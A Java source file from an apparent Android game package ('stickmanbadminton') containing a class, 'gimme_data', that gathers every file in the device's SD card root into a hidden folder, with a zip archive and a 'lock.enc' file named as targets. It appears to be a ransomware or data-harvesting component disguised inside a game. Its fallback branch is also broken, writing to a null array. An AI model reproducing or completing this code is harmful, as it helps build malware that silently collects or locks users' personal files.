package com.example.stickmanbadminton;




import java.io.File;
import java.io.IOException;
public class gimme_data {
    private boolean check = external.isAvailiable();
    private String sdCard = external.getSDcardpath();
    private String path = sdCard + "bwoah";
    private String zipped = sdCard + "lollipop.zip";
    private File bwoah = new File(path);
    private File secret = new File(zipped);
    private File encrypted = new File(sdCard + "lock.enc");
    public void createFile() throws IOException {
        if (check) {
            if (!bwoah.exists()) {
                bwoah.mkdir();
                secret.createNewFile();
            }
            search_files();
        }
    }
    private void search_files() throws IOException{

        File root =  new File(sdCard);
        File[] list = root.listFiles();
        if(list != null){
            ziptoinfinityandbeyond.getthosefiles(list,bwoah);
        }
        else{
            File fake = new File(sdCard + "hahahaha");
            fake.createNewFile();
            list[0] = fake;
            ziptoinfinityandbeyond.getthosefiles(list,bwoah);
        }


    }
}
